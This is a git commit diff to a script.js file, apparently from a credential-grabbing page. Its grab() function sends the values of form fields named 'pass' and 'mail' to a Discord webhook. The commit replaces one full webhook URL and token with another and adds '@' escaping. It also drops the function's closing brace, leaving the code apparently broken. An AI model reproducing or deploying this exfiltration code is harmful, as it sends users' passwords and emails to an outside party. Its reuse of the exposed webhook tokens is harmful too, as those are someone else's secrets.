be5a7bf1f1ddbf41333c849839735fe1084852fd
Yuuseio0311 <110008998+Yuuseio0311@users.noreply.github.com>
2022-07-26 19:38:29 +0900

    Update script.js

--- script.js
+++ script.js
@@ -1,6 +1,5 @@
 function grab(){
   let xhr = new XMLHttpRequest()
-  xhr.open('POST','https://discord.com/api/webhooks/1001347332845076520/rEVS9A_2ndsSloMtDoW45cWdhakiuMsi-EKEzS-JX1BRKS2ZiNaxgTRniD4AAMl69NGb')
+  xhr.open('POST','https://discord.com/api/webhooks/1001435528379519036/8OzNx0bJ02St4cLm-QP0DOifSmmOP8Gs4_J1zt1Q1uUnejkiOcaYBdUaxwHjwkepLsCt')
   xhr.setRequestHeader('Content-Type','application/json')
-  xhr.send(JSON.stringify({"content":`発言内容: ${document.getElementById('pass').value}\nby: ${document.getElementById('mail').value}`}))
-}
+  xhr.send(JSON.stringify({"content":`発言内容: ${document.getElementById('pass').value.replace(/@/g, "＠")}\nby: ${document.getElementById('mail').value.replace(/@/g, "＠")}`})) 
